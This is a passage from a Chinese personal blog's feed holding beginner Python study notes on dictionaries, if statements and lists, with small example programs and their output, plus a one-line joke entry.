class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5, &#x27;x_position&#x27;: 0, &#x27;y_position&#x27;: 0&#125;</span><br></pre></td></tr></table></figure><h6 id="修改字典中的值"><a href="#修改字典中的值" class="headerlink" title="修改字典中的值"></a>修改字典中的值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alien_0=&#123;&#x27;color&#x27;:&#x27;green&#x27;&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line">alien_0[&#x27;color&#x27;]=&#x27;yellow&#x27;</span><br><span class="line">print(f&quot;now it&#x27;s &#123;alien_0&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;&#125;</span><br><span class="line">now it&#x27;s &#123;&#x27;color&#x27;: &#x27;yellow&#x27;&#125;</span><br></pre></td></tr></table></figure><h6 id="删除字典中的键值对"><a href="#删除字典中的键值对" class="headerlink" title="删除字典中的键值对"></a>删除字典中的键值对</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alien_0=&#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;point&#x27;:5&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line">del alien_0[&#x27;color&#x27;]</span><br><span class="line">print(alien_0)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;point&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;point&#x27;: 5&#125;</span><br></pre></td></tr></table></figure><h6 id="来一个大家伙"><a href="#来一个大家伙" class="headerlink" title="来一个大家伙"></a>来一个大家伙</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favorite_language =&#123;</span><br><span class="line">&#x27;edward&#x27;:&#x27;rudy&#x27;,</span><br><span class="line">&#x27;jen&#x27;:&#x27;python&#x27;,</span><br><span class="line">&#x27;phil&#x27;:&#x27;python&#x27;,</span><br><span class="line">&#x27;sarah&#x27;:&#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">language = favorite_language[&#x27;sarah&#x27;].title()</span><br><span class="line">print(f&quot;sarah&#x27;s favorite language is &#123;language&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sarah&#x27;s favorite language is C</span><br></pre></td></tr></table></figure><h6 id="使用方法get来访问值"><a href="#使用方法get来访问值" class="headerlink" title="使用方法get来访问值"></a>使用方法get来访问值</h6><p>get（）方法的第一个参数用于指定值，第二个参数为指定的键不存在的时候要返回的值，可省略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;speed&#x27;:&#x27;slow&#x27;&#125;</span><br><span class="line">point_value = alien_0.get(&#x27;color&#x27;,&#x27;0_o&#x27;)</span><br><span class="line">print(point_value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">green</span><br></pre></td></tr></table></figure><p>但是如果我换一个数值呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;speed&#x27;:&#x27;slow&#x27;&#125;</span><br><span class="line">point_value = alien_0.get(&#x27;spend&#x27;,&#x27;0_o&#x27;)</span><br><span class="line">print(point_value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0_o//(好一个杰西卡)</span><br></pre></td></tr></table></figure><h6 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user = &#123;</span><br><span class="line">&#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">&#x27;first&#x27;:&#x27;enrico&#x27;,</span><br><span class="line">&#x27;last&#x27;:&#x27;fermi&#x27;</span><br><span class="line">&#125;</span><br><span class="line">for key,value in user.items():</span><br><span class="line">print(f&quot;\nkey:&#123;key&#125;&quot;)</span><br><span class="line">print(f&quot;vale:&#123;value&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key:username</span><br><span class="line">vale:admin</span><br><span class="line"></span><br><span class="line">key:first</span><br><span class="line">vale:enrico</span><br><span class="line"></span><br><span class="line">key:last</span><br><span class="line">vale:fermi</span><br></pre></td></tr></table></figure><p>这里不是使用keys()和values()方法，只是设了两个局部变量使得key=键，value等于值而已</p><p>item（）方法返回一个键值对列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    &#x27;edward&#x27;: &#x27;rudy&#x27;,</span><br><span class="line">    &#x27;jen&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;phil&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;sarah&#x27;: &#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">friends = [&#x27;sarah&#x27;,&#x27;jen&#x27;]               //这里的“，”很关键，这是分隔开两个的，   如果没有的话会默认两个连接在一起输出</span><br><span class="line">for name in favorite_languages.keys():</span><br><span class="line">    print(f&quot;&#123;name.title()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    if name in friends:</span><br><span class="line">        language = favorite_languages[name].title()</span><br><span class="line">        print(f&quot;&#123;name.title()&#125;,i know you like &#123;language&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Edward</span><br><span class="line">Jen</span><br><span class="line">Jen,i know you like Python</span><br><span class="line">Phil</span><br><span class="line">Sarah</span><br><span class="line">Sarah,i know you like C</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>key()方法：返回一个字典所有的键。</p><h6 id="按照特定顺序来遍历字典中的所有键"><a href="#按照特定顺序来遍历字典中的所有键" class="headerlink" title="按照特定顺序来遍历字典中的所有键"></a>按照特定顺序来遍历字典中的所有键</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    &#x27;jen&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;phil&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;edward&#x27;: &#x27;rudy&#x27;,</span><br><span class="line">    &#x27;sarah&#x27;: &#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">for name in sorted(favorite_languages.keys()):</span><br><span class="line">    print(f&quot;&#123;name.title()&#125;,thanks for you &quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Edward,thanks for you </span><br><span class="line">Jen,thanks for you </span><br><span class="line">Phil,thanks for you </span><br><span class="line">Sarah,thanks for you </span><br></pre></td></tr></table></figure><p>set()可以找出独一无二的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    &#x27;jen&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;phil&#x27;: &#x27;python&#x27;,</span><br><span class="line">    &#x27;edward&#x27;: &#x27;rudy&#x27;,</span><br><span class="line">    &#x27;sarah&#x27;: &#x27;c&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">for language in set(favorite_languages.values()):</span><br><span class="line">    print(f&quot;&#123;language.title()&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rudy</span><br><span class="line">Python</span><br><span class="line">C</span><br></pre></td></tr></table></figure><p>keys() 方法用于返回字典中的所有键；values() 方法用于返回字典中所有键对应的值</p><h6 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alien_00=&#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">alien_01=&#123;&#x27;color&#x27;:&#x27;blue&#x27;,&#x27;points&#x27;:6&#125;</span><br><span class="line">alien_02=&#123;&#x27;color&#x27;:&#x27;red&#x27;,&#x27;points&#x27;:9&#125;</span><br><span class="line">alien_03=&#123;&#x27;color&#x27;:&#x27;yellow&#x27;,&#x27;points&#x27;:7&#125;</span><br><span class="line">aliens=[alien_00,alien_01,alien_02,alien_03]</span><br><span class="line">for alien in aliens:</span><br><span class="line">print(alien)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;blue&#x27;, &#x27;points&#x27;: 6&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;red&#x27;, &#x27;points&#x27;: 9&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;points&#x27;: 7&#125;</span><br></pre></td></tr></table></figure><p>大量使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">aliens = []</span><br><span class="line">for alien_number in range(20):</span><br><span class="line">new_alien = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;point&#x27;:5&#125;</span><br><span class="line">aliens.append(new_alien)</span><br><span class="line"></span><br><span class="line">for alien in aliens[:3]:</span><br><span class="line">if alien[&#x27;color&#x27;]==&#x27;green&#x27;:</span><br><span class="line">alien[&#x27;color&#x27;]=&#x27;yellow&#x27;</span><br><span class="line">alien[&#x27;point&#x27;]=&#x27;10&#x27;</span><br><span class="line">elif alien[&#x27;color&#x27;]==&#x27;yellow&#x27;:</span><br><span class="line">alien[&#x27;color&#x27;]=&#x27;red&#x27;</span><br><span class="line">alien[&#x27;point&#x27;]=&#x27;20&#x27;</span><br><span class="line">for alien in aliens[:5]:</span><br><span class="line">print(alien)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;point&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;point&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;point&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;point&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;point&#x27;: 5&#125;</span><br></pre></td></tr></table></figure><h6 id="在字典中存储列表"><a href="#在字典中存储列表" class="headerlink" title="在字典中存储列表"></a>在字典中存储列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pizza = &#123;</span><br><span class="line">&#x27;sort&#x27;:&#x27;好好好&#x27;,</span><br><span class="line">&#x27;materials&#x27;:[&#x27;好&#x27;,&#x27;好个寂寞好&#x27;],</span><br><span class="line">&#125;</span><br><span class="line">print(f&quot;you order a &#123;pizza[&#x27;sort&#x27;]&#125; pizza&quot;)</span><br><span class="line">for material in pizza[&#x27;materials&#x27;]:</span><br><span class="line">print(&#x27;\t&#x27;+material)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you order a 好好好 pizza</span><br><span class="line">好</span><br><span class="line">好个寂寞好</span><br></pre></td></tr></table></figure><h6 id="在字典中存储字典"><a href="#在字典中存储字典" class="headerlink" title="在字典中存储字典"></a>在字典中存储字典</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">users = &#123;</span><br><span class="line">&#x27;admin&#x27;: &#123;</span><br><span class="line">&#x27;first&#x27;:&#x27;ann&#x27;,</span><br><span class="line">&#x27;last&#x27;:&#x27;bbaa&#x27;,</span><br><span class="line">&#x27;location&#x27;:&#x27;A点&#x27;,</span><br><span class="line">&#125;,//&quot;,&quot;切记切记</span><br><span class="line">&#x27;adminstor&#x27;: &#123;</span><br><span class="line">&#x27;first&#x27;:&#x27;daa&#x27;,</span><br><span class="line">&#x27;last&#x27;:&#x27;ccaa&#x27;,</span><br><span class="line">&#x27;location&#x27;:&#x27;B点&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for user_name,user_info in users.items():        //items()返回一个键值对，</span><br><span class="line">   user_name等于前面的键</span><br><span class="line">   user_info等于后面的值</span><br><span class="line">print(f&quot;username:&#123;user_name&#125;&quot;)</span><br><span class="line">print(f&quot;full name:&#123;user_info[&#x27;first&#x27;]&#125;&#123;user_info[&#x27;last&#x27;]&#125;&quot;)</span><br><span class="line">print(f&quot;location:&#123;user_info[&#x27;location&#x27;]&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">full name:annbbaa</span><br><span class="line">location:A点</span><br><span class="line">username:adminstor</span><br><span class="line">full name:daaccaa</span><br><span class="line">location:B点</span><br></pre></td></tr></table></figure><p>这一块挺乱的我感觉，字典跟之前的if和for循环贴在一起了，再加上keys(),values(),items()等等几个方法，多练练吧0_o</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土-if语句</title>
      <link href="/2023/03/23/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-if%E8%AF%AD%E5%8F%A5/"/>
      <url>/2023/03/23/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-if%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><h4 id="if语句-1"><a href="#if语句-1" class="headerlink" title="if语句"></a>if语句</h4><p>跟C语言一样，Python中的if语句也是一样的，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">names = [&#x27;琪亚娜&#x27;,&#x27;芽衣&#x27;,&#x27;布洛妮娅&#x27;,&#x27;希儿&#x27;,&#x27;德丽莎&#x27;]</span><br><span class="line">for name in names:</span><br><span class="line"></span><br><span class="line">if name == &#x27;琪亚娜&#x27;:</span><br><span class="line">print(f&#x27;&#123;name&#125;&#x27;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;没有未来的未来不是我想要的未来&#x27;)</span><br></pre></td></tr></table></figure><p>上面这个句子是定义了一个names列表，然后对列表进行循环，if在这里判断是不是‘琪亚娜’，如果是，输出名字，否则则输出‘没有未来的未来不是我想要的未来’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">琪亚娜</span><br><span class="line">没有未来的未来不是我想要的未来</span><br><span class="line">没有未来的未来不是我想要的未来</span><br><span class="line">没有未来的未来不是我想要的未来</span><br><span class="line">没有未来的未来不是我想要的未来</span><br></pre></td></tr></table></figure><p>条件测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;name = &#x27;琪亚娜&#x27;</span><br><span class="line">&gt;&gt;&gt;name == &#x27;芽衣&#x27;</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>小小的玩一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">car = &#x27;subaru&#x27;</span><br><span class="line">print(&quot;Is car == &#x27;subaru&#x27;?I think is true&quot;)</span><br><span class="line">print(car == &#x27;subaru&#x27;)</span><br></pre></td></tr></table></figure><p>这个东西的输出是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Is car == &#x27;subaru&#x27;?I think is true</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h4 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if-elif-else"></a>if-elif-else</h4><p>就是正常的C中的if else else</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 19</span><br><span class="line">if age &lt; 4:</span><br><span class="line">print(&#x27;免费仔&#x27;)</span><br><span class="line">elif 4&lt;age&lt;18:</span><br><span class="line">print(&#x27;半价仔&#x27;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;全价人&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全价人</span><br></pre></td></tr></table></figure><p>此外,if不仅仅只有==的功能，同样的它还可以判断是否在列表中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=[&#x27;懒&#x27;,&#x27;懒1&#x27;,&#x27;懒2&#x27;,&#x27;懒3&#x27;]</span><br><span class="line">if &#x27;卷&#x27; in name:</span><br><span class="line">print(&quot;卷王&quot;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;每天光是混吃等死就已经压力很大了&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每天光是混吃等死就已经压力很大了</span><br></pre></td></tr></table></figure><p>if语句不难，而且大多数和C语言中的相似，所以这里就不赘述了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>今日无事，勾栏听曲</title>
      <link href="/2023/03/22/%E6%87%921/"/>
      <url>/2023/03/22/%E6%87%921/</url>
      
        <content type="html"><![CDATA[<p>如题，今日无事，勾栏听曲</p>]]></content>
      
      
      
        <tags>
            
            <tag> 史诗级鸽子精 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土--操作列表</title>
      <link href="/2023/03/21/Pyhton--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F--%E6%93%8D%E4%BD%9C%E5%88%97%E8%A1%A8/"/>
      <url>/2023/03/21/Pyhton--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F--%E6%93%8D%E4%BD%9C%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="遍历整个列表"><a href="#遍历整个列表" class="headerlink" title="遍历整个列表"></a>遍历整个列表</h3><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">people = [&#x27;ann&#x27;,&#x27;bee&#x27;,&#x27;c++&#x27;,&#x27;dev--c&#x27;]</span><br><span class="line">for person in people:</span><br><span class="line">print(person)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ann</span><br><span class="line">bee</span><br><span class="line">c++</span><br><span class="line">dev--c</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><p>Python中的for循环与C语言中的不一样，C语言中的是</p><p>for(中间是循环条件)</p><p>但Python的是for (临时变量) in （列表）</p><p>而且需要注意的是，Python每次运行循环的时候需要注意在后面添加一个:，这在C语言中是不层出现过的，C语言中，for后面不需要加任何的标点符号。</p><h5 id="在for循环中进行更多的操作，比如说"><a href="#在for循环中进行更多的操作，比如说" class="headerlink" title="在for循环中进行更多的操作，比如说"></a>在for循环中进行更多的操作，比如说</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">people = [&#x27;ann&#x27;,&#x27;bee&#x27;,&#x27;c++&#x27;,&#x27;dev--c&#x27;]</span><br><span class="line">for person in people:</span><br><span class="line">print(f“&#123;person.title()&#125;,you are a good man&quot;)</span><br><span class="line">print(f&quot;i can&#x27;t meet a better man than you,f&#123;person.title()&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ann,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,Ann</span><br><span class="line">Bee,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,Bee</span><br><span class="line">C++,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,C++</span><br><span class="line">Dev--C,you are a good man</span><br><span class="line">i can&#x27;t meet a better man than you,Dev--C</span><br></pre></td></tr></table></figure><p>在for循环中，想要包含多少行代码都是可以的，实际上，你会发现使用for循环对每个元素执行众多不同的操作很有用</p><h6 id="注意事项：（一股子翻译腔味道）"><a href="#注意事项：（一股子翻译腔味道）" class="headerlink" title="注意事项：（一股子翻译腔味道）"></a>注意事项：（一股子翻译腔味道）</h6><ol><li>注意缩进，切记注意，你永远不知道你会犯下什么样的错误直到有人指出来</li><li>注意标点符号，注意冒号，这很重要，你知道的</li></ol><h5 id="创建数值列表"><a href="#创建数值列表" class="headerlink" title="创建数值列表"></a>创建数值列表</h5><h6 id="使用函数range"><a href="#使用函数range" class="headerlink" title="使用函数range"></a>使用函数range</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for value in range(1,5):</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>没错，range(1,5)只打印了1-4，这回死编程语言中常见的差一行为的结果，函数range（）让python从指定的第一个值开始数，并在到达你指定的第二个值时停止。这就是他不输出5的原因。当然，如果你执意要打印1-5，只需要输入range(1,6)</p><h6 id="使用range创建数值列表"><a href="#使用range创建数值列表" class="headerlink" title="使用range创建数值列表"></a>使用range创建数值列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;number = list(range(1,6))</span><br><span class="line">&gt;&gt;&gt;print(number)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4, 5]</span><br></pre></td></tr></table></figure><p>需要注意的是，上面的list后面使用的实施（）而不是【】，如果你使用【】的话，那就是输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list[range(1, 6)]</span><br></pre></td></tr></table></figure><p>使用range时还可以指定步长，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">number = list(range(2,11,2))</span><br><span class="line">print(number)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2, 4, 6, 8, 10]</span><br></pre></td></tr></table></figure><p>使用range（）几乎能够创建任何需要的数集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">squares = []</span><br><span class="line">for value in range(1,11):</span><br><span class="line">square = value ** 2</span><br><span class="line">squares.append(square)</span><br><span class="line">print(squares)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><p>可以小小的进行优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 